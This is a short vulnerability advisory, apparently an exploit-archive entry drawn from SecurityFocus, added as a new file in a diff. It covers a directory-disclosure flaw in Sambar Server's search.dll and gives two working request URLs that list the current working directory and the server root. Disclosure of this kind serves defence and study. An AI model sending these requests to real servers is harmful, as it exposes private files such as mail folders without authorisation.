@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/1684/info
+
+The Sambar Server was created to test a three-tier communication infrastructure modeled after the Sybase Open Client/Open Server. Soon thereafter, the idea of leveraging the infrastructure for dynamic delivery of content on the WWW resulted in the addition of an HTTP protocol stack, and efforts in supporting the notion of preexistent users via HTTP. 
+
+Certain NT versions of this software ship with a vulnerability in the search.dll which allows remote attackers to view the contents of the SAMBAR Server such as mail folders etc by passing paths or invalid values in the 'query' variable.
+
+All that is needed is a malformed query parameter parsed to the search.dll file
+.
+
+http://server-running-sambar.com/search.dll?search?query=%00&logic=AND
+
+.. this will reveal the current working directory contents.
+
+
+http://server-running-sambar.com/search.dll?search?query=/&logic=AND
+
+.. this will reveal the root dir of the server.
